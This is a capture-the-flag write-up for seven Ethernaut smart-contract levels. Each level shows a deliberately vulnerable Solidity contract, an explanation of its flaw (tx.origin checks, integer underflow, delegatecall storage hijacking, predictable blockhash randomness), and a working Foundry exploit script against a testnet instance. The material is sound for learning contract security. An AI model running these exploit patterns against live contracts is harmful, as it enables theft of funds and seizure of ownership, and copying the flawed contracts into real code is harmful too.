---
layout: default
title: "Ethernaut "
# date: 2025-09-16
categories: ctf Blockchain
---

**Easy access :** [Fallback](#fallback) . [Fal1out](#fal1out) . [CoinFlip](#coinflip) . [Telephone](#telephone) . [Token](#token) . [Delegation](#delegation) . [GatekeeperOne](#gatekeeperone)

---

# #Fallback

**Challenge:** Claim ownership of the contract and reduce contract's balance to 0.

**Contract** 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
In this contract , the contract is changing it's owner in three different places: 
- `owner = msg.sender;` in the constructor 
- `owner = msg.sender;` in the contribute function 
- `owner = msg.sender;` in the receive function 

So we can become owner from any one of these .

1. Using constructor ❌
2. Using contribute function -> yes we can become the owner but for that we need to add more contributions than the current owner and we cannot do it once . we can only add less than 0.001 ether to our contributions at once. So to become owner we should repeat adding contributions with ether less than 0.001 untill you become owner. So it is time consuming and high cost as it needs many transcations. 
so using contribute function ❌.
1. using Receive function ? Let's see..

In receive we have require and we need to pass that to become owner. To pass this , we need contributions > 0 and msg.value > 0 . 

`receive` is called when we send ETH to the contract without any data , so we call it by sending some ETH (greater than 0) to the contract but before that do one contribution to the contract so that contributions will be greater than 0 . 

receive triggered -> require passed -> and we will become The OWNER . 

**Here's the Foundry script that solves the challenge**

```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/Level01.sol";
import {Script , console} from "forge-std/Script.sol";

contract Level01Solution is Script{

    Fallback fallbackInstance = Fallback(payable(0x176876a12E75801Dd798B0464F040eBdF6139469)); //place Instance address  

    function run() external {
        vm.startBroadcast();

        fallbackInstance.contribute{value: 1 wei}();

        (bool success , )=address(fallbackInstance).call{value: 0.0001 ether}("");
        require(success, "Call failed");
        console.log("NewOwner: ", fallbackInstance.owner());
        console.log("my Address:", vm.envAddress("ADDRESS"));
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }

}
```


---

# #Fal1out

**challenge :** Claim the ownership of the contract .

**contract** 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```
**Tip : While Trying to Hack the contract or Exploting the contract we should doubt everything that looks weired.**

When i saw the contract it's version looked weired for me , i was like whyy..? why ^0.6.0 version ?? 

with that question in my mind , I moved into the contract 

In the contract we have a function `Fal1out` but it is commented as Constructor and it is weired right ?

So after sometime I came to know that in the older versions there is no constructor keyword ,  if we use the contract name itself for a funtion it will become the constructor. 

But in our contract the fuction commented as constructor is not a constructor because the names are not exactly same `Fallout` & `Fal1out`.
so using that , we can claim the ownership by just calling that function with some ETH .

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import {Fallout} from "../src/Fal1out.sol";
import {Script } from "forge-std/Script.sol";


contract Fal1outSolution  is Script{

    Fallout falloutInstance = Fallout(payable(0x24a9926C6311c62956efb3d501BAf72D4eb444d8));

    function run() public payable {
        vm.startBroadcast();
        falloutInstance.Fal1out{value : msg.value}();
        vm.stopBroadcast();
    }
}
```
---
# #CoinFlip 

**Challenge :** We need to build up our winning streak by guessing the outcome of a coin flip. That is we need to guess the correct outcome of a coin 10 times in a row .

**Contract**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
Here Vulnerability lies in the line `uint256 blockValue = uint256(blockhash(block.number - 1));`

The Ethereum Virtual Machine (EVM) provides access to the block hashes of the 256 most recent blocks, excluding the current block. This means that when our `flip()` function is called in block N, the `blockhash(block.number - 1)` will be the hash of block N-1, which has already been mined and is publicly known on the blockchain.

So we always know `blockValue` and `FACTOR` --> the side of a coin is **predictable**. 

To solve the challenge  we need to calculate (as same as CoinFlip contract) the side of the coin using previous block hash and then call `flip` function using calculated side of coin.(calculating and calling should be in the same TX).

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {CoinFlip} from "../src/CoinFlip.sol";
import {Script } from "forge-std/Script.sol";
import "forge-std/console.sol";


contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(CoinFlip _coinflipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        _coinflipInstance.flip(side);
    }
}
contract CoinFlipSolution is Script{

    CoinFlip coinflipInstance = CoinFlip(0x87d21355195d253C9fEED5941E91440C67c98746);
    
    function run() public payable {
        vm.startBroadcast();
        new Player(coinflipInstance);
        console.log("Consecutive Wins: ", coinflipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
```
I ran the following command 10 times in the terminal , everytime I run consecutive wins increase .
```terminal
forge script script/CoinFlipSolution.s.sol:CoinFlipSolution --private-key $PRI
VATE_KEY --rpc-url $SEPOLIA_RPC_URL --broadcast
```

---
# #Telephone

**Challenge :** Claim ownership of the contract.

**Contract**

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
`tx.origin` -> it always returns the EOA (Externally Owned Account) who initiated the TX.

So with this thing we can solve the challenge using the followig foundry script 

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";
import {console} from "forge-std/console.sol";

contract Attack {

    constructor (Telephone _telephone , address _newOwner) {
        _telephone.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {
    
    Telephone telephone = Telephone(0x0a75A78330f44276dF198d1AF2Ebb2b6b2f38a8a); // instance
    
    function run() public {
       vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
       console.log("Current owner:", telephone.owner());
         new Attack(telephone, vm.envAddress("ADDRESS"));
         console.log("New owner:", telephone.owner());
       vm.stopBroadcast();
    }

}
```
---

# #Token

**Challenge :** We need to get your hands on any additional tokens. Preferably a very large amount of tokens.

Initially we are given 20 tokens.

**Contract**
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

In older EVM versions there is no default type checking for `Overflows` and `Underflows` , So they Wrap around.

In our case the Vulnerability lies in this line `require(balances[msg.sender] - _value >= 0);` . If the value is `21`  ,
20-21 = -1 --> uint256 cannot have negative values --> wraps to the max of uint256 . ( that's the huge amount of tokens we gonna get ). And Our balance will be max of uint256 and the `to` address gets 21 tokens . And challenge Solved !.

**Here's the Foundry script that solves the challenge**
```Foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Token} from "../src/Token.sol";
import "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";

contract TokenSolution is Script {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(privateKey);
        console.log("address of attacker: " , attacker);

        vm.startBroadcast(privateKey);
        Token token = Token(0x61a83C282BFF4Ed900a7ad77024633f032285EAC);//instance address
        token.transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 , 21);//to address
        vm.stopBroadcast();

        uint256 balance = token.balanceOf(attacker);
        console.log("Attacker address: ", attacker);
        console.log("Balance after exploit: ", balance);
        console.log(address(msg.sender));
    }
}
```
---

# #Delegation

**Challenge :** Claim the ownership of the Instance (Delegation contract).

**Contract** 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```
This contract uses `delegatecall` in the fallback function to call the Delegate contract . 
`delegatecall` will maintain original `msg.sender` and `mag.value` , but executes in the **caller's storage context** . 
so calling `pwn` through the Delegation contract will trigger `fallback` , that calls `pwn` in the Delegate contract and that changes the `owner` variable of the Delegation contract -> makes msg.sender (us) as owner.

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Delegation} from "../src/Delegation.sol";
import "forge-std/console.sol";

contract DelegationSolution  is Script{

    function run() public {
        Delegation delegation = Delegation(0xd8bf6b90C8Fd31463f4473F16A0EabFD8c24AAd9); //instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(privateKey);
        console.log(delegation.owner());
        vm.startBroadcast(attacker);
        (bool success , ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "not hacked");
        vm.stopBroadcast();
        console.log(delegation.owner());

    }
}
```
---

---
# #GateKeeperOne 

**Challenge :** We need to become an **entrant** in this contract , but for that we need to pass three gates ( Modifiers )

**Contract** 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
`gateOne` -> we can easily pass it as we done it earlier in **Telephone** contract . 

**How to pass `gateTwo` ?** 
Let's see 

`gasleft()` returns the remaining gas left in the current execution context. We need that to be multiple of **8191** . So we use low level **call** function where we can specify the gas , we send gas amount as multiples of **8191** so that `gasleft() % 8191 == 0` satifies. But gas usage depends on many factors like EVM version , Network Conditions and many more , so we cannot be sure that `gasleft()` in the modifier returns exactly multiple of 8191. So i felt better to use `for` loop to send 8191 multiples gas amount repeatedly and somewhere `gasleft` returns exact multiple of **8191**.

Like this we can pass this modifier .

**What about `gateTree(bytes8 _gateKey)` ?**

To pass this we need to understand , how EVM handles comparisons of same types differ in sizes . And i have understood them and that made me to pass this modifier .

The parameter **_gateKey** should be like 0xXXXXXXX(any number other than 0) 0000 _ _ _ _ . The first 7 chars can be ny number  , eighth char can be any number other than zero , 9, 10 ,11, 12 chars should be zero , and then last 4 should be the last four chars of address of `tx.origin`.

for example : bytes8 _gateKey = **`0x0000000100006c17`** where tx.origin is `0xC6EDD10e757f88da71DE403BB5f8De15538e6C17`.

**Here's the Foundry script that solves the challenge**
```foundry
// SPDX-License-Idenifier: MIT
pragma solidity ^0.8.0;
import {Script} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";
import {console} from "forge-std/console.sol";

contract Attack {
    GatekeeperOne public gatekeeper ;

    constructor (GatekeeperOne _gatekeeper) {
        gatekeeper = _gatekeeper;
    }

   function exploit(bytes8 _key) public {
    for (uint256 i = 0; i < 8191; i++) {
        (bool success,) = address(gatekeeper).call{gas: 8191 * 10 + i}(
            abi.encodeWithSignature("enter(bytes8)", _key)
        );
        if (success) {
            // Found the correct gas offset
            break;
        }
    }
}
    
}

contract GatekeeperSolution is Script {
    
    GatekeeperOne gatekeeperOne = GatekeeperOne(0x9262e95bC9612a968F9Ab46Bd8B155816A32eECA); // instance address
    
    function run() public {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);

        console.log("Attacker address:", attacker);

        uint16 last16 = uint16(uint160(attacker));
        bytes8 gateKey = bytes8(uint64(last16) | (uint64(1) << 32));
        console.logBytes8(gateKey);

        vm.startBroadcast(attackerPrivateKey);

        Attack attack = new Attack(gatekeeperOne);

        attack.exploit(gateKey);
        
        vm.stopBroadcast();
        
        // Verify the attack was successful
        require(gatekeeperOne.entrant() == attacker, "Attack failed");
        console.log("Success! Entrant is now:", gatekeeperOne.entrant());

    }

}
```

---
